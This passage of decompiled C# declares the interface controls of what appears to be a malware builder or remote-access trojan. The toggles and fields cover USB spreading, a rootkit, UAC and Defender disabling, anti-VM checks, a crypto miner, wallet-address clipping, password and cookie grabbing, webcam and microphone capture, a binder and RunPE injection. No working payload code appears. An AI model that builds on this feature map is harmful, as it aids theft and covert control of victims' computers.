	[AccessedThroughProperty("PictureBox42")]
	[CompilerGenerated]
	public PictureBox pictureBox_24;

	[AccessedThroughProperty("Stxt")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_7;

	[AccessedThroughProperty("Label61")]
	[CompilerGenerated]
	public Label label_36;

	[AccessedThroughProperty("PictureBox39")]
	[CompilerGenerated]
	public PictureBox pictureBox_25;

	[AccessedThroughProperty("Label53")]
	[CompilerGenerated]
	public Label label_37;

	[CompilerGenerated]
	[AccessedThroughProperty("Sexe")]
	public Guna2ToggleSwitch guna2ToggleSwitch_8;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox29")]
	public PictureBox pictureBox_26;

	[CompilerGenerated]
	[AccessedThroughProperty("Srar")]
	public Guna2ToggleSwitch guna2ToggleSwitch_9;

	[CompilerGenerated]
	[AccessedThroughProperty("Label15")]
	public Label label_38;

	[AccessedThroughProperty("PictureBox36")]
	[CompilerGenerated]
	public PictureBox pictureBox_27;

	[AccessedThroughProperty("Label37")]
	[CompilerGenerated]
	public Label label_39;

	[AccessedThroughProperty("Szip")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_10;

	[AccessedThroughProperty("Guna2GradientPanel6")]
	[CompilerGenerated]
	public Guna2GradientPanel guna2GradientPanel_6;

	[AccessedThroughProperty("Guna2Separator1")]
	[CompilerGenerated]
	public Guna2Separator guna2Separator_0;

	[AccessedThroughProperty("PictureBox24")]
	[CompilerGenerated]
	public PictureBox pictureBox_28;

	[CompilerGenerated]
	[AccessedThroughProperty("Run_Explorer")]
	public Guna2ToggleSwitch guna2ToggleSwitch_11;

	[CompilerGenerated]
	[AccessedThroughProperty("Label7")]
	public Label label_40;

	[AccessedThroughProperty("PictureBox54")]
	[CompilerGenerated]
	public PictureBox pictureBox_29;

	[AccessedThroughProperty("PictureBox55")]
	[CompilerGenerated]
	public PictureBox pictureBox_30;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox53")]
	public PictureBox pictureBox_31;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox52")]
	public PictureBox pictureBox_32;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox43")]
	public PictureBox pictureBox_33;

	[AccessedThroughProperty("USB")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_12;

	[CompilerGenerated]
	[AccessedThroughProperty("Label62")]
	public Label label_41;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox38")]
	public PictureBox pictureBox_34;

	[AccessedThroughProperty("Create_lnk")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_13;

	[CompilerGenerated]
	[AccessedThroughProperty("Label49")]
	public Label label_42;

	[AccessedThroughProperty("PictureBox40")]
	[CompilerGenerated]
	public PictureBox pictureBox_35;

	[CompilerGenerated]
	[AccessedThroughProperty("Label57")]
	public Label label_43;

	[AccessedThroughProperty("Auto_Startup")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_14;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox41")]
	public PictureBox pictureBox_36;

	[CompilerGenerated]
	[AccessedThroughProperty("Create_vbs")]
	public Guna2ToggleSwitch guna2ToggleSwitch_15;

	[AccessedThroughProperty("Label58")]
	[CompilerGenerated]
	public Label label_44;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox44")]
	public PictureBox pictureBox_37;

	[AccessedThroughProperty("Rotk")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_16;

	[CompilerGenerated]
	[AccessedThroughProperty("Label63")]
	public Label label_45;

	[AccessedThroughProperty("PictureBox45")]
	[CompilerGenerated]
	public PictureBox pictureBox_38;

	[CompilerGenerated]
	[AccessedThroughProperty("Run_UAC")]
	public Guna2ToggleSwitch guna2ToggleSwitch_17;

	[AccessedThroughProperty("Label64")]
	[CompilerGenerated]
	public Label label_46;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox46")]
	public PictureBox pictureBox_39;

	[AccessedThroughProperty("Label65")]
	[CompilerGenerated]
	public Label label_47;

	[CompilerGenerated]
	[AccessedThroughProperty("UAC")]
	public Guna2ToggleSwitch guna2ToggleSwitch_18;

	[AccessedThroughProperty("PictureBox47")]
	[CompilerGenerated]
	public PictureBox pictureBox_40;

	[CompilerGenerated]
	[AccessedThroughProperty("Hide_install")]
	public Guna2ToggleSwitch guna2ToggleSwitch_19;

	[CompilerGenerated]
	[AccessedThroughProperty("Label66")]
	public Label label_48;

	[AccessedThroughProperty("PictureBox57")]
	[CompilerGenerated]
	public PictureBox pictureBox_41;

	[CompilerGenerated]
	[AccessedThroughProperty("AntiVM")]
	public Guna2ToggleSwitch guna2ToggleSwitch_20;

	[AccessedThroughProperty("h_file")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_21;

	[CompilerGenerated]
	[AccessedThroughProperty("Label67")]
	public Label label_49;

	[AccessedThroughProperty("Label68")]
	[CompilerGenerated]
	public Label label_50;

	[AccessedThroughProperty("PictureBox58")]
	[CompilerGenerated]
	public PictureBox pictureBox_42;

	[AccessedThroughProperty("PictureBox59")]
	[CompilerGenerated]
	public PictureBox pictureBox_43;

	[CompilerGenerated]
	[AccessedThroughProperty("Label69")]
	public Label label_51;

	[AccessedThroughProperty("Protect_Process")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_22;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox56")]
	public PictureBox pictureBox_44;

	[AccessedThroughProperty("PictureBox48")]
	[CompilerGenerated]
	public PictureBox pictureBox_45;

	[AccessedThroughProperty("Panel11")]
	[CompilerGenerated]
	public Panel panel_26;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox51")]
	public PictureBox pictureBox_46;

	[AccessedThroughProperty("Protect_Spreading")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_23;

	[CompilerGenerated]
	[AccessedThroughProperty("Label73")]
	public Label label_52;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox50")]
	public PictureBox pictureBox_47;

	[CompilerGenerated]
	[AccessedThroughProperty("Protect_Startup")]
	public Guna2ToggleSwitch guna2ToggleSwitch_24;

	[CompilerGenerated]
	[AccessedThroughProperty("Label72")]
	public Label label_53;

	[AccessedThroughProperty("PictureBox49")]
	[CompilerGenerated]
	public PictureBox pictureBox_48;

	[AccessedThroughProperty("Protect_Install")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_25;

	[AccessedThroughProperty("Label71")]
	[CompilerGenerated]
	public Label label_54;

	[AccessedThroughProperty("Label70")]
	[CompilerGenerated]
	public Label label_55;

	[AccessedThroughProperty("PictureBox60")]
	[CompilerGenerated]
	public PictureBox pictureBox_49;

	[AccessedThroughProperty("MSG")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_26;

	[AccessedThroughProperty("Guna2GradientPanel10")]
	[CompilerGenerated]
	public Guna2GradientPanel guna2GradientPanel_7;

	[AccessedThroughProperty("PictureBox69")]
	[CompilerGenerated]
	public PictureBox pictureBox_50;

	[AccessedThroughProperty("PictureBox17")]
	[CompilerGenerated]
	public PictureBox pictureBox_51;

	[AccessedThroughProperty("Kill_Process")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_27;

	[AccessedThroughProperty("Label51")]
	[CompilerGenerated]
	public Label label_56;

	[AccessedThroughProperty("Label5")]
	[CompilerGenerated]
	public Label label_57;

	[AccessedThroughProperty("Delete_SRS")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_28;

	[AccessedThroughProperty("Label75")]
	[CompilerGenerated]
	public Label label_58;

	[AccessedThroughProperty("PictureBox64")]
	[CompilerGenerated]
	public PictureBox pictureBox_52;

	[AccessedThroughProperty("WD_exception")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_29;

	[AccessedThroughProperty("Label77")]
	[CompilerGenerated]
	public Label label_59;

	[AccessedThroughProperty("PictureBox67")]
	[CompilerGenerated]
	public PictureBox pictureBox_53;

	[AccessedThroughProperty("Disable_Hide")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_30;

	[AccessedThroughProperty("Tab_Process")]
	[CompilerGenerated]
	public Guna2GradientPanel guna2GradientPanel_8;

	[CompilerGenerated]
	[AccessedThroughProperty("Listkill")]
	public ListView listView_3;

	[AccessedThroughProperty("ColumnHeader31")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_32;

	[AccessedThroughProperty("PictureBox61")]
	[CompilerGenerated]
	public PictureBox pictureBox_54;

	[CompilerGenerated]
	[AccessedThroughProperty("Label74")]
	public Label label_60;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2GradientButton1")]
	public Guna2GradientButton xbruEkvjBZ;

	[AccessedThroughProperty("List_Kill")]
	[CompilerGenerated]
	public Guna2TextBox YlUuWsehjr;

	[AccessedThroughProperty("PictureBox68")]
	[CompilerGenerated]
	public PictureBox pictureBox_55;

	[CompilerGenerated]
	[AccessedThroughProperty("Disable_Control")]
	public Guna2ToggleSwitch guna2ToggleSwitch_31;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox62")]
	public PictureBox pictureBox_56;

	[AccessedThroughProperty("PictureBox63")]
	[CompilerGenerated]
	public PictureBox pictureBox_57;

	[CompilerGenerated]
	[AccessedThroughProperty("Label76")]
	public Label label_61;

	[AccessedThroughProperty("Label50")]
	[CompilerGenerated]
	public Label okDuDeshj7;

	[CompilerGenerated]
	[AccessedThroughProperty("Disable_Task")]
	public Guna2ToggleSwitch guna2ToggleSwitch_32;

	[CompilerGenerated]
	[AccessedThroughProperty("Disable_UAC")]
	public Guna2ToggleSwitch guna2ToggleSwitch_33;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox66")]
	public PictureBox pictureBox_58;

	[AccessedThroughProperty("Label79")]
	[CompilerGenerated]
	public Label tdcucsJoPl;

	[CompilerGenerated]
	[AccessedThroughProperty("Disable_WD")]
	public Guna2ToggleSwitch guna2ToggleSwitch_34;

	[CompilerGenerated]
	[AccessedThroughProperty("Label80")]
	public Label label_62;

	[AccessedThroughProperty("Remove_List_Connection")]
	[CompilerGenerated]
	public ContextMenuStrip contextMenuStrip_2;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem19")]
	public ToolStripMenuItem toolStripMenuItem_51;

	[AccessedThroughProperty("ToolStripMenuItem26")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_52;

	[CompilerGenerated]
	[AccessedThroughProperty("Remove_List_Kill")]
	public ContextMenuStrip contextMenuStrip_3;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem27")]
	public ToolStripMenuItem qjButVfmuR;

	[AccessedThroughProperty("ToolStripMenuItem28")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_53;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2GradientPanel11")]
	public Guna2GradientPanel guna2GradientPanel_9;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox70")]
	public PictureBox pictureBox_59;

	[AccessedThroughProperty("ETH")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_8;

	[CompilerGenerated]
	[AccessedThroughProperty("GXMR")]
	public Guna2TextBox guna2TextBox_9;

	[AccessedThroughProperty("BTC")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_10;

	[CompilerGenerated]
	[AccessedThroughProperty("XLM")]
	public Guna2TextBox guna2TextBox_11;

	[AccessedThroughProperty("XRP")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_12;

	[CompilerGenerated]
	[AccessedThroughProperty("LTC")]
	public Guna2TextBox guna2TextBox_13;

	[CompilerGenerated]
	[AccessedThroughProperty("XMR")]
	public Guna2ToggleSwitch guna2ToggleSwitch_35;

	[AccessedThroughProperty("Label87")]
	[CompilerGenerated]
	public Label label_63;

	[AccessedThroughProperty("Panel36")]
	[CompilerGenerated]
	public Panel panel_27;

	[CompilerGenerated]
	[AccessedThroughProperty("Wallet_address")]
	public Guna2TextBox guna2TextBox_14;

	[AccessedThroughProperty("POOL")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_15;

	[AccessedThroughProperty("PictureBox72")]
	[CompilerGenerated]
	public PictureBox pictureBox_60;

	[CompilerGenerated]
	[AccessedThroughProperty("NVIDIA")]
	public Guna2ToggleSwitch guna2ToggleSwitch_36;

	[CompilerGenerated]
	[AccessedThroughProperty("Label83")]
	public Label label_64;

	[AccessedThroughProperty("Label85")]
	[CompilerGenerated]
	public Label label_65;

	[AccessedThroughProperty("PictureBox74")]
	[CompilerGenerated]
	public PictureBox pictureBox_61;

	[CompilerGenerated]
	[AccessedThroughProperty("Grabber")]
	public Guna2ToggleSwitch guna2ToggleSwitch_37;

	[CompilerGenerated]
	[AccessedThroughProperty("CPU")]
	public Guna2ToggleSwitch guna2ToggleSwitch_38;

	[CompilerGenerated]
	[AccessedThroughProperty("Label86")]
	public Label label_66;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox75")]
	public PictureBox pictureBox_62;

	[CompilerGenerated]
	[AccessedThroughProperty("Label89")]
	public Label label_67;

	[AccessedThroughProperty("AMD")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_39;

	[AccessedThroughProperty("PictureBox65")]
	[CompilerGenerated]
	public PictureBox bkNpwekXw0;

	[AccessedThroughProperty("Proxy_Port")]
	[CompilerGenerated]
	public Guna2TextBox ytOpyjdqmr;

	[CompilerGenerated]
	[AccessedThroughProperty("Enable_Proxy")]
	public Guna2ToggleSwitch guna2ToggleSwitch_40;

	[CompilerGenerated]
	[AccessedThroughProperty("Label78")]
	public Label label_68;

	[AccessedThroughProperty("Proxy_Host")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_16;

	[AccessedThroughProperty("NEC")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_17;

	[AccessedThroughProperty("PictureBox73")]
	[CompilerGenerated]
	public PictureBox pictureBox_63;

	[AccessedThroughProperty("Guna2GradientPanel8")]
	[CompilerGenerated]
	public Guna2GradientPanel guna2GradientPanel_10;

	[AccessedThroughProperty("Loading")]
	[CompilerGenerated]
	public RadioButton radioButton_2;

	[CompilerGenerated]
	[AccessedThroughProperty("RunPE")]
	public RadioButton radioButton_3;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox71")]
	public PictureBox pictureBox_64;

	[AccessedThroughProperty("Label81")]
	[CompilerGenerated]
	public Label label_69;

	[AccessedThroughProperty("Binder_Path")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_18;

	[CompilerGenerated]
	[AccessedThroughProperty("Enable_Binder")]
	public Guna2ToggleSwitch guna2ToggleSwitch_41;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox76")]
	public PictureBox pictureBox_65;

	[CompilerGenerated]
	[AccessedThroughProperty("Binder_Run")]
	public Guna2ToggleSwitch guna2ToggleSwitch_42;

	[CompilerGenerated]
	[AccessedThroughProperty("Label82")]
	public Label label_70;

	[CompilerGenerated]
	[AccessedThroughProperty("Binder_ComboBox1")]
	public Guna2ComboBox guna2ComboBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2GradientPanel13")]
	public Guna2GradientPanel guna2GradientPanel_11;

	[CompilerGenerated]
	[AccessedThroughProperty("Add_icon")]
	public Guna2GradientButton guna2GradientButton_1;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2GradientPanel12")]
	public Guna2GradientPanel guna2GradientPanel_12;

	[CompilerGenerated]
	[AccessedThroughProperty("GeRan")]
	public Guna2GradientButton guna2GradientButton_2;

	[CompilerGenerated]
	[AccessedThroughProperty("Clone_F")]
	public Guna2GradientButton UuFpavoRyw;

	[CompilerGenerated]
	[AccessedThroughProperty("As5")]
	public Guna2TextBox guna2TextBox_19;

	[CompilerGenerated]
	[AccessedThroughProperty("As4")]
	public Guna2TextBox guna2TextBox_20;

	[AccessedThroughProperty("As3")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_21;

	[CompilerGenerated]
	[AccessedThroughProperty("As2")]
	public Guna2TextBox guna2TextBox_22;

	[CompilerGenerated]
	[AccessedThroughProperty("Label88")]
	public Label label_71;

	[CompilerGenerated]
	[AccessedThroughProperty("As1")]
	public Guna2TextBox guna2TextBox_23;

	[AccessedThroughProperty("Guna2ToggleSwitch2")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_43;

	[CompilerGenerated]
	[AccessedThroughProperty("Label84")]
	public Label label_72;

	[AccessedThroughProperty("Enable_icon")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_44;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox_icon")]
	public PictureBox pictureBox_66;

	[AccessedThroughProperty("Path_icon")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_24;

	[CompilerGenerated]
	[AccessedThroughProperty("num4")]
	public NumericUpDown numericUpDown_1;

	[AccessedThroughProperty("num3")]
	[CompilerGenerated]
	public NumericUpDown numericUpDown_2;

	[AccessedThroughProperty("Label41")]
	[CompilerGenerated]
	public Label label_73;

	[AccessedThroughProperty("num2")]
	[CompilerGenerated]
	public NumericUpDown numericUpDown_3;

	[CompilerGenerated]
	[AccessedThroughProperty("num1")]
	public NumericUpDown numericUpDown_4;

	[AccessedThroughProperty("Button10")]
	[CompilerGenerated]
	public Button button_14;

	[CompilerGenerated]
	[AccessedThroughProperty("Button9")]
	public Button button_15;

	[AccessedThroughProperty("Button8")]
	[CompilerGenerated]
	public Button svfpdpqsyh;

	[AccessedThroughProperty("Panel39")]
	[CompilerGenerated]
	public Panel tgeplwduEn;

	[AccessedThroughProperty("NETFRAMWORKS")]
	[CompilerGenerated]
	public Guna2ComboBox guna2ComboBox_1;

	[AccessedThroughProperty("Label90")]
	[CompilerGenerated]
	public Label label_74;

	[AccessedThroughProperty("Panel38")]
	[CompilerGenerated]
	public Panel panel_28;

	[AccessedThroughProperty("PictureBox83")]
	[CompilerGenerated]
	public PictureBox pictureBox_67;

	[AccessedThroughProperty("CMD")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_11;

	[AccessedThroughProperty("PictureBox84")]
	[CompilerGenerated]
	public PictureBox pictureBox_68;

	[AccessedThroughProperty("BAT")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_12;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox85")]
	public PictureBox pictureBox_69;

	[CompilerGenerated]
	[AccessedThroughProperty("PIF")]
	public Guna2RadioButton guna2RadioButton_13;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox82")]
	public PictureBox pictureBox_70;

	[CompilerGenerated]
	[AccessedThroughProperty("COM")]
	public Guna2RadioButton guna2RadioButton_14;

	[AccessedThroughProperty("PictureBox81")]
	[CompilerGenerated]
	public PictureBox pictureBox_71;

	[AccessedThroughProperty("SCR")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_15;

	[AccessedThroughProperty("Label60")]
	[CompilerGenerated]
	public Label label_75;

	[AccessedThroughProperty("PictureBox80")]
	[CompilerGenerated]
	public PictureBox pictureBox_72;

	[AccessedThroughProperty("EXE")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_16;

	[AccessedThroughProperty("Panel37")]
	[CompilerGenerated]
	public Panel panel_29;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox78")]
	public PictureBox pictureBox_73;

	[AccessedThroughProperty("MMinings")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_45;

	[AccessedThroughProperty("Label56")]
	[CompilerGenerated]
	public Label label_76;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox79")]
	public PictureBox pictureBox_74;

	[AccessedThroughProperty("Label59")]
	[CompilerGenerated]
	public Label label_77;

	[AccessedThroughProperty("MPASSZ")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_46;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel35")]
	public Panel panel_30;

	[AccessedThroughProperty("Logs")]
	[CompilerGenerated]
	public TabPage tabPage_11;

	[AccessedThroughProperty("Settings")]
	[CompilerGenerated]
	public TabPage tabPage_12;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel27")]
	public Panel panel_31;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2GradientButton2")]
	public Guna2GradientButton guna2GradientButton_3;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox25")]
	public PictureBox pictureBox_75;

	[CompilerGenerated]
	[AccessedThroughProperty("scrI")]
	public Guna2ComboBox guna2ComboBox_2;

	[AccessedThroughProperty("Label39")]
	[CompilerGenerated]
	public Label label_78;

	[AccessedThroughProperty("ShowAlert")]
	[CompilerGenerated]
	public Guna2CheckBox guna2CheckBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("LOGLERR")]
	public Guna2CheckBox guna2CheckBox_1;

	[CompilerGenerated]
	[AccessedThroughProperty("LOGMSGS")]
	public Guna2CheckBox guna2CheckBox_2;

	[CompilerGenerated]
	[AccessedThroughProperty("LOGRERR")]
	public Guna2CheckBox guna2CheckBox_3;

	[CompilerGenerated]
	[AccessedThroughProperty("LOGCONNECTIONS")]
	public Guna2CheckBox guna2CheckBox_4;

	[AccessedThroughProperty("LOGLOGIN")]
	[CompilerGenerated]
	public Guna2CheckBox guna2CheckBox_5;

	[AccessedThroughProperty("Panel25")]
	[CompilerGenerated]
	public Panel panel_32;

	[CompilerGenerated]
	[AccessedThroughProperty("MICAUT")]
	public Guna2CheckBox guna2CheckBox_6;

	[AccessedThroughProperty("PictureBox4")]
	[CompilerGenerated]
	public PictureBox pictureBox_76;

	[AccessedThroughProperty("MICI")]
	[CompilerGenerated]
	public Guna2ComboBox guna2ComboBox_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Label36")]
	public Label label_79;

	[AccessedThroughProperty("Panel5")]
	[CompilerGenerated]
	public Panel panel_33;

	[CompilerGenerated]
	[AccessedThroughProperty("CAMAUT")]
	public Guna2CheckBox guna2CheckBox_7;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox3")]
	public PictureBox pictureBox_77;

	[CompilerGenerated]
	[AccessedThroughProperty("CAMI")]
	public Guna2ComboBox guna2ComboBox_4;

	[AccessedThroughProperty("Label35")]
	[CompilerGenerated]
	public Label label_80;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel3")]
	public Panel panel_34;

	[AccessedThroughProperty("SCAUT")]
	[CompilerGenerated]
	public Guna2CheckBox guna2CheckBox_8;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox2")]
	public PictureBox pictureBox_78;

	[CompilerGenerated]
	[AccessedThroughProperty("SCI")]
	public Guna2ComboBox guna2ComboBox_5;

	[AccessedThroughProperty("Label34")]
	[CompilerGenerated]
	public Label label_81;

	[CompilerGenerated]
	[AccessedThroughProperty("Abouts")]
	public TabPage tabPage_13;

	[CompilerGenerated]
	[AccessedThroughProperty("NOTF_L1_Miner")]
	public Guna2Button guna2Button_12;

	[CompilerGenerated]
	[AccessedThroughProperty("Notf_pass")]
	public Guna2Button guna2Button_13;

	[AccessedThroughProperty("List_pass")]
	[CompilerGenerated]
	public ListView listView_4;

	[AccessedThroughProperty("ColumnHeader37")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_33;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader38")]
	public ColumnHeader columnHeader_34;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader39")]
	public ColumnHeader columnHeader_35;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2GradientPanel14")]
	public Guna2GradientPanel guna2GradientPanel_13;

	[AccessedThroughProperty("Passwords")]
	[CompilerGenerated]
	public TabPage tabPage_14;

	[CompilerGenerated]
	[AccessedThroughProperty("Miner")]
	public TabPage tabPage_15;

	[AccessedThroughProperty("Grabberff")]
	[CompilerGenerated]
	public TabPage tabPage_16;

	[CompilerGenerated]
	[AccessedThroughProperty("CPASS")]
	public ContextMenuStrip contextMenuStrip_4;

	[AccessedThroughProperty("ToolStripMenuItem29")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_54;

	[AccessedThroughProperty("Guna2GradientPanel15")]
	[CompilerGenerated]
	public Guna2GradientPanel guna2GradientPanel_14;

	[AccessedThroughProperty("L1_Miner")]
	[CompilerGenerated]
	public ListView wmlGqvJgny;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader40")]
	public ColumnHeader columnHeader_36;

	[AccessedThroughProperty("ColumnHeader41")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_37;

	[AccessedThroughProperty("ColumnHeader43")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_38;

	[AccessedThroughProperty("ColumnHeader44")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_39;

	[AccessedThroughProperty("ColumnHeader45")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_40;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader46")]
	public ColumnHeader columnHeader_41;

	[AccessedThroughProperty("Guna2GradientPanel16")]
	[CompilerGenerated]
	public Guna2GradientPanel guna2GradientPanel_15;

	[AccessedThroughProperty("L1_Grabber")]
	[CompilerGenerated]
	public ListView listView_5;

	[AccessedThroughProperty("ColumnHeader42")]
	[CompilerGenerated]
	public ColumnHeader CfdnxAwScc;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader47")]
	public ColumnHeader columnHeader_42;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader52")]
	public ColumnHeader columnHeader_43;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader53")]
	public ColumnHeader columnHeader_44;

	[CompilerGenerated]
	[AccessedThroughProperty("NOTF_BRBS1")]
	public Guna2Button guna2Button_14;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox31")]
	public PictureBox pictureBox_79;

	[AccessedThroughProperty("Label91")]
	[CompilerGenerated]
	public Label label_82;

	[CompilerGenerated]
	[AccessedThroughProperty("MBRBZ")]
	public Guna2ToggleSwitch LbbnyRuehY;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel28")]
	public Panel panel_35;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2GradientPanel17")]
	public Guna2GradientPanel guna2GradientPanel_16;

	[CompilerGenerated]
	[AccessedThroughProperty("Logisx")]
	public ListView listView_6;

	[AccessedThroughProperty("ColumnHeader32")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_45;

	[AccessedThroughProperty("ColumnHeader33")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_46;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader50")]
	public ColumnHeader columnHeader_47;

	[AccessedThroughProperty("Cok_Save")]
	[CompilerGenerated]
	public ContextMenuStrip contextMenuStrip_5;

	[AccessedThroughProperty("ToolStripMenuItem30")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_55;

	[CompilerGenerated]
	[AccessedThroughProperty("SaveFileDialog1")]
	public SaveFileDialog saveFileDialog_0;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox26")]
	public PictureBox pictureBox_80;

	[CompilerGenerated]
	[AccessedThroughProperty("Label40")]
	public Label label_83;

	[CompilerGenerated]
	[AccessedThroughProperty("Cookies")]
	public Guna2ToggleSwitch guna2ToggleSwitch_47;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel29")]
	public Panel panel_36;

	[AccessedThroughProperty("PictureBox28")]
	[CompilerGenerated]
	public PictureBox pictureBox_81;

	[AccessedThroughProperty("Label44")]
	[CompilerGenerated]
	public Label label_84;

	[AccessedThroughProperty("Encrypt")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_48;

	[AccessedThroughProperty("TXT_SPOOFING")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_25;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox77")]
	public PictureBox afxnWeqRcY;

	[CompilerGenerated]
	[AccessedThroughProperty("Label92")]
	public Label label_85;

	[CompilerGenerated]
	[AccessedThroughProperty("SPOFFING")]
	public Guna2ToggleSwitch guna2ToggleSwitch_49;

	[AccessedThroughProperty("ColumnHeader48")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_48;

	[AccessedThroughProperty("NOTF_COK")]
	[CompilerGenerated]
	public Guna2Button guna2Button_15;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel30")]
	public Panel panel_37;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel40")]
	public Panel panel_38;

	[AccessedThroughProperty("Panel41")]
	[CompilerGenerated]
	public Panel panel_39;

	[CompilerGenerated]
	[AccessedThroughProperty("Scan_pass")]
	public Guna2Button guna2Button_16;

	[AccessedThroughProperty("Label17")]
	[CompilerGenerated]
	public Label label_86;

	[AccessedThroughProperty("PictureBox86")]
	[CompilerGenerated]
	public PictureBox pictureBox_82;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel42")]
	public Panel panel_40;

	[AccessedThroughProperty("Pass_len")]
	[CompilerGenerated]
	public Guna2Button guna2Button_17;

	[CompilerGenerated]
	[AccessedThroughProperty("Label93")]
	public Label label_87;

	[AccessedThroughProperty("PictureBox87")]
	[CompilerGenerated]
	public PictureBox pictureBox_83;

	[AccessedThroughProperty("Label94")]
	[CompilerGenerated]
	public Label label_88;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2CircleProgressBar2")]
	public Guna2CircleProgressBar guna2CircleProgressBar_3;

